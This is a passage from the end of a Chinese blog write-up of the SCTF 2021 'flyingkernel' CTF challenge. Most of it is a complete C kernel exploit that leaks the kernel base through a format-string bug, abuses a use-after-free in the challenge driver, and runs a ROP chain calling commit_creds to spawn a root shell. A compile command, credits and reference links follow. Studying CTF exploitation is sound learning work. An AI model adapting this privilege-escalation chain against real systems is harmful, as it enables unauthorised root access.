class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We can launch ioctl / read / write for this device driver.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For ioctl command we have:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6666 for UAF</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x7777 for Fmt string vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x5555 alloc of size 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC         0x5555</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UAF                0x6666</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET                0x7777</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>* rip;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> rflags;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>* rsp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"></span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(   <span class="string">"mov tf+8, cs;"</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="string">"pushf;"</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="string">"pop tf+16;"</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="string">"mov tf+24, rsp;"</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="string">"mov tf+32, ss;"</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">                        )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_target</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        fd = open(<span class="string">"/dev/seven"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">        assert(fd &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> lock;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset_buf</span><span class="params">(<span class="keyword">void</span> *tmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> buf[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">                buf[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        char buf[0x81];</span></span><br><span class="line"><span class="comment">        memset(buf, 'M', 0x80);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        lock = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                write(fd, buf, <span class="number">0x20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>* argv[] = &#123;<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_chunk_rop</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop;</span><br><span class="line">        <span class="keyword">int</span> i = (<span class="number">0x1000000</span>/<span class="number">2</span>)/<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_base + (<span class="number">0xffffffff8108c360</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = kernel_base + (<span class="number">0xffffffff8108c780</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = kernel_base + <span class="number">0x16e9</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax = kernel_base + (<span class="number">0xffffffff813d7369</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_rep = kernel_base + (<span class="number">0xffffffff81aed04b</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rcx = kernel_base + (<span class="number">0xffffffff8101ed83</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_cr3_rdi = kernel_base + (<span class="number">0xffffffff8105734a</span> <span class="number">-0xffffffff81000000</span>); <span class="comment">//: mov cr3, rdi ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> or_rax_rdx = kernel_base + (<span class="number">0xffffffff81018d2c</span> <span class="number">-0xffffffff81000000</span>); <span class="comment">//: or rax, rdx ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx = kernel_base + (<span class="number">0xffffffff8104abb7</span><span class="number">-0xffffffff81000000</span>); <span class="comment">// pop rdx; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax = kernel_base + (<span class="number">0xffffffff8100ec67</span><span class="number">-0xffffffff81000000</span>); <span class="comment">// pop rax; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rax_cr3 = kernel_base + (<span class="number">0xffffffff81057fab</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//: mov rax, cr3 ; mov cr3, rax ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_cr3_rax = kernel_base + (<span class="number">0xffffffff81057fae</span> - <span class="number">0xffffffff81000000</span>);<span class="comment">//: mov cr3, rax ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = kernel_base + (<span class="number">0xffffffff81c00f58</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = kernel_base + (<span class="number">0xffffffff81024f92</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore = kernel_base + (<span class="number">0xffffffff81c00e26</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   0xffffffff816e19bc:        mov    esp,0x83000000</span></span><br><span class="line"><span class="comment">                   0xffffffff816e19c1:        ret </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pivot = kernel_base + <span class="number">0x6e19bc</span>;</span><br><span class="line">        rop = mmap(<span class="number">0x83000000</span>-(<span class="number">0x1000000</span>/<span class="number">2</span>), <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        rop[<span class="number">0</span>] = <span class="number">0xdeadbeaf</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;(<span class="number">0x1000000</span>/<span class="number">2</span>)/<span class="number">8</span>;)</span><br><span class="line">                rop[i++] = <span class="number">0xffffffff816e19bc</span>;</span><br><span class="line">        <span class="comment">//rop[i++] = mov_rax_cr3;</span></span><br><span class="line">        <span class="comment">//rop[i++] = pop_rdx;</span></span><br><span class="line">        <span class="comment">//rop[i++] = 0x1000;</span></span><br><span class="line">        <span class="comment">//rop[i++] = or_rax_rdx;</span></span><br><span class="line">        <span class="comment">//rop[i++] = mov_cr3_rax;</span></span><br><span class="line">        rop[i++] = pop_rdi;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = prepare_kernel_cred;</span><br><span class="line">        rop[i++] = pop_rcx;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = mov_rdi_rax_rep;</span><br><span class="line">        rop[i++] = commit_creds;</span><br><span class="line">        rop[i++] = swapgs_restore;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = shell;</span><br><span class="line">        rop[i++] = tf.cs;</span><br><span class="line">        rop[i++] = tf.rflags;</span><br><span class="line">        rop[i++] = tf.rsp;</span><br><span class="line">        rop[i++] = tf.ss;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ROP fake stack %p\n"</span>, rop);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// When testing when being already root.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_text_base</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> b[<span class="number">0x10000</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> leak;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> kmsg = open(<span class="string">"/dev/kmsg"</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">        assert(kmsg &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        ret = read(kmsg, b, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">        assert(ret &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        p = <span class="built_in">strchr</span>(b, <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        leak = strtoul(p+<span class="number">1</span>, <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        leak -= <span class="number">0x1f3ecd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> leak;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x81</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"></span><br><span class="line">        save_state();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// open the target device driver.</span></span><br><span class="line"></span><br><span class="line">        open_target();</span><br><span class="line"></span><br><span class="line">        ret = ioctl(fd, ALLOC, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">//memset(buf, 'M', 0x80);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(buf, <span class="string">"data : %lld %lld %lld %lld %lld \xff%lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld\n"</span>);</span><br><span class="line"></span><br><span class="line">        ret = write(fd, buf, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">        assert(ret &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Trying to printk that data we wrote.</span></span><br><span class="line"></span><br><span class="line">        ret = ioctl(fd, GET, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trying to have the text base!</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                kernel_base = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>) - <span class="number">0x1f3ecd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//kernel_base = get_text_base();</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Kernel base %lx\n"</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">        setup_chunk_rop(kernel_base);</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trying to fill that freed chunk with struct subprocess_info</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Trying to bruteforce it.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//sleep(0.1);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Trying to free our chunk for UAD</span></span><br><span class="line"></span><br><span class="line">        ret = ioctl(fd, UAF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">        pthread_create(&amp;tid, <span class="literal">NULL</span>, memset_buf, kernel_base + <span class="number">0x6e19bc</span>);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1</span>; i++)</span><br><span class="line"></span><br><span class="line">                ret = socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//write(fd, buf, 0x20);</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.3</span>);</span><br><span class="line"></span><br><span class="line">        lock = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//printf("socket returned %d\n", ret);</span></span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译命令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -osploit -pthread -static -Os suexp.c -lutil -masm=intel -s</span><br></pre></td></tr></table></figure>
<p>pthread库肯定是要链接上的，编译成static也是为了避免依赖库的问题，-masm=intel是为了支持intel汇编格式，这里如果你用的不是intel汇编就可以不加这句。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢SU的wp，上面exp基本是拷贝SU的exp，只能说有些队wp原来还能写一句话，现在连一句话都不贴了，麻</p>
<p><a href="https://team-su.github.io/passages/2021-12-25-SCTF/#flyingkernel" target="_blank" rel="noopener">SCTF 2021 SU Write-Up | TEAM-SU</a></p>
<h2 id="Refs："><a href="#Refs：" class="headerlink" title="Refs："></a>Refs：</h2><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#the-simplest-exploit---ret2usr" target="_blank" rel="noopener">Learning Linux Kernel Exploitation - Part 1 - Midas Blog (lkmidas.github.io)</a></p>
<p> <a href="https://www.anquanke.com/post/id/204319#h3-9" target="_blank" rel="noopener">Kernel Pwn 学习之路 - 番外 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1622987" target="_blank" rel="noopener">Kmalloc申请内存源码分析 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="http://pzhxbz.cn/?p=153" target="_blank" rel="noopener">（翻译）kernel pwn中能利用的一些结构体 – pzhxbz的技术笔记本</a></p>
<p><a href="https://kagehutatsu.com/?p=504" target="_blank" rel="noopener">CVE-2016-6187复现以及struct subprocess_info的劫持-Pwn影二つ的博客 (kagehutatsu.com)</a></p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/workqueue.h#L97" target="_blank" rel="noopener">workqueue.h - include/linux/workqueue.h - Linux source code (v5.15.11) - Bootlin</a> 在线看内核代码的网站</p>
<p><a href="https://xz.aliyun.com/t/7625#toc-5" target="_blank" rel="noopener">Linux Kernel Pwn 初探 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://team-su.github.io/passages/2021-12-25-SCTF/#flyingkernel" target="_blank" rel="noopener">SCTF 2021 SU Write-Up | TEAM-SU</a></p>

      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/12/19/HouseOfPig/" rel="next" title="House of pig复现">
                <i class="fa fa-chevron-left"></i> House of pig复现
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2022/01/14/BoofuzzDoc/" rel="prev" title="Boofuzz 分析">
                Boofuzz 分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="zzrR0">
            
              <p class="site-author-name" itemprop="name">zzrR0</p>
              <p class="site-description motion-element" itemprop="description">Why am i so cai.</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">2</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
            </nav>
          

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://xmzyshypnc.github.io/" title="xmzyshypnc" target="_blank">xmzyshypnc</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://wood1314.github.io/" title="Wood" target="_blank">Wood</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.zeddyu.info/" title="Zedd" target="_blank">Zedd</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Kernel-Pwn-amp-amp-SCTF-flyingpwn-WP"><span class="nav-number">1.</span> <span class="nav-text">Kernel Pwn &amp;&amp; SCTF flyingpwn  WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel-保护机制"><span class="nav-number">1.1.1.</span> <span class="nav-text">Kernel 保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KASLR"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">KASLR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP和SMAP"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">SMEP和SMAP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kernel-crash"><span class="nav-number">1.1.2.</span> <span class="nav-text">kernel crash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#core-and-thread"><span class="nav-number">1.1.3.</span> <span class="nav-text">core and thread</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel-extract"><span class="nav-number">1.1.4.</span> <span class="nav-text">Kernel extract</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件系统"><span class="nav-number">1.1.5.</span> <span class="nav-text">文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kmalloc"><span class="nav-number">1.1.6.</span> <span class="nav-text">Kmalloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">1.1.7.</span> <span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-info"><span class="nav-number">1.2.2.</span> <span class="nav-text">subprocess_info</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露kernel-base"><span class="nav-number">1.2.3.</span> <span class="nav-text">泄露kernel base</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.3.</span> <span class="nav-text">exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refs："><span class="nav-number">1.5.</span> <span class="nav-text">Refs：</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zzrR0</span>

  

  
</div>




  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>






        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv" title="总访客量">
